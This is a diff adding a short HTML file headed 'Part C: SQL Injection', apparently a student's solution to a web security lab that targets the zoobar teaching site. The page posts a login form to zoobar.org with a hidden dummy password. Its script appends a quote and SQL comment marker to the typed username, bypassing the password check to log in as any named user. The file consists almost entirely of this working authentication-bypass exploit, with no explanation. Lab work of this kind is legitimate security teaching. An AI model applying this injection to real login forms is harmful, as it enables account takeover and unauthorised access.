@@ -1,0 +1,21 @@
+<DOCTYPE html>
+	<html>
+		<head>Part C: SQL Injection</head>
+		<body>
+	
+			<form name="loginform" action="http://zoobar.org/index.php" method="POST">
+				<input id="username" type="text" name="login_username">
+				<input type="hidden" name="login_password" value="Yo">	
+				<input id="send" type="submit" name="submit_login" value="Log in">
+			</form>
+
+			<script>
+				document.getElementById("send").addEventListener("click", sender);
+				function sender(){
+					document.getElementById("username").value += "'--";
+				};
+			</script>
+		</body>
+	</html>
+</DOCTYPE>
+
